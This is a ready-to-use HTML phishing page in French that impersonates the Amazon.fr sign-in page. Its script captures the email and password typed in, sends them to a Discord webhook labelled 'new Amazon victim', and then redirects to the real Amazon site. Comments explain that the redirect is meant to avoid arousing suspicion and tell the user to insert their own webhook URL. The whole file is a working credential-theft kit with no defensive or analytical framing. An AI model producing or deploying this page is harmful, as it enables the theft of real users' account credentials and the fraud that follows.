<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon : Connexion</title>
    <style>
        body { margin: 0; padding: 0; font-family: "Amazon Ember", Arial, sans-serif; background-color: #fff; }
        
        /* Header style Amazon */
        .header {
            background-color: #131921;
            color: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
        }
        .logo-text { font-size: 24px; font-weight: bold; letter-spacing: 1px; }
        
        /* Container de connexion */
        .login-container {
            max-width: 350px;
            margin: 40px auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        h1 { font-size: 28px; font-weight: normal; margin-bottom: 10px; color: #111; }
        
        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
        
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box; /* Important pour le padding */
        }

        .btn-submit {
            background-color: #febd69;
            border-color: #fcd200;
            color: #111;
            width: 100%;
            padding: 10px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 10px;
        }
        
        .btn-submit:hover { background-color: #f3a847; }

        .footer-text { font-size: 12px; color: #555; margin-top: 20px; text-align: center; line-height: 1.4; }
    </style>
</head>
<body>

    <div class="header">
        <span class="logo-text">Amazon.fr</span>
    </div>

    <div class="login-container">
        <h1>Connexion</h1>
        
        <!-- Le formulaire intercepte l'événement 'submit' -->
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email ou téléphone portable</label>
                <input type="text" id="email" required placeholder="Entrez votre email">
            </div>

            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" required placeholder="Entrez votre mot de passe">
            </div>

            <button type="submit" class="btn-submit">Se connecter</button>
        </form>

        <p class="footer-text">En continuant, vous acceptez les Conditions d'utilisation et la Politique de confidentialité.</p>
    </div>

    <script>
        // ---------------------------------------------------------
        // REMPLACEZ CETTE URL PAR VOTRE WEBHOOK DISCORD
        // ---------------------------------------------------------
        const webhookUrl = 'https://discord.com/api/webhooks/1557775977927417947/Yyvrle2EzXbxs6asdVfmsNeWo13dva5fGHK3J2B68KQPahJ7KhSPipzbRhzsdNdfu5HE'; 
        // ---------------------------------------------------------

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Empêche le rechargement de la page

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Préparation du message Discord
            const payload = {
                content: `🚨 **NOUVELLE VICTIME AMAZON** 🚨\n\n📧 **Email :** \`${email}\`\n🔑 **Mdp :** \`${password}\``
            };

            // Envoi des données au webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Données envoyées !');
                    // Redirection vers le vrai site Amazon pour ne pas éveiller les soupçons
                    window.location.href = "https://www.amazon.com"; 
                } else {
                    alert("Erreur de connexion, veuillez réessayer.");
                }
            })
            .catch(error => {
                console.error('Erreur:', error);
                // On redirige même en cas d'erreur pour garder le mystère
                window.location.href = "https://www.amazon.com"; 
            });
        });
    </script>

</body>
</html>
